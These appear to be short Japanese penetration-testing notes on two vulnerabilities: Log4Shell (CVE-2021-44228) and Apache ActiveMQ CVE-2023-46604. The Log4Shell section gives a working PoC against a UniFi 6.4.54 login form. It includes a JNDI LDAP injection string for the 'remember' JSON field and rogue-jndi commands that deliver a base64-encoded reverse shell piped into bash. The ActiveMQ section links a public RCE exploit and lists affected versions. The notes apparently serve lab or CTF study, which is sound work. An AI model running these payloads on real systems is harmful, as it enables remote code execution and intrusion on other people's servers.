# CVE-2021-44228
Log4j2とはJavaアプリでログを効率的に記録するためのApacheが開発したオープンソースのライブラリ。  
Log4j2に搭載されていたLookup機能が悪用されたことが原因。  
Lookup機能の一つであるJNDI Lookupはログに特定の文字列`${...}`が含まれている場合、それを変数として評価し、外部リソースからデータを取得する機能。  
この機能が外部のLDAPへの参照を処理する場合に、外部から指定された任意のJavaオブジェクトのクラスファイルをダウンロードし、アプリ内で実行してしまう。

## PoC（Unifi 6.4.54のログインフォーム）
バージョン`6.5.53`以前が影響を受けていたため  
ログインフォームのリクエスト内にあるJSONオブジェクト、`remember`を使用。  
`"remember":"${jndi.ldap://<IP>:1389/o=tomcat}"`
```bash
# LDAPサーバーを起動し、悪意のあるJavaクラスを返すためにrogue-jndiを使用
git clone https://github.com/veracode-research/rogue-jndi
mvn package # Mavenでビルド
echo '<リバースシェル>' | base64 # リバースシェルをbase64エンコード
java -jar target/RogueJndi-1.1 --command "bash -c {echo,<Base64エンコードしたリバースシェル>}|{base64,-d}|{bash,-i}" --hostname <ターゲット>
# rogue-jndiで起動したLDAPサーバーへアクセスし、Javaクラスをダウンロードしてリバースシェルが実行される。
```

# CVE-2023-46604
Apache ActiveMQの脆弱性。  
Apache ActiveMQとはオープンソースのJavaベースのメッセージブローカー。  
Apache ActiveMQが使用するOpenWireプロトコルの処理方法に起因していて、メッセージ内のデータを十分に検証せずデシリアライズしてしまう。

## PoC（ActiveMQ 5.15.5）
https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python

## 影響バージョン
Apache ActiveMQ　5.18.0 ～ 5.18.2  
Apache ActiveMQ　5.17.0 ～ 5.17.5  
Apache ActiveMQ　5.16.0 ～ 5.16.6  
Apache ActiveMQ　～ 5.15.15
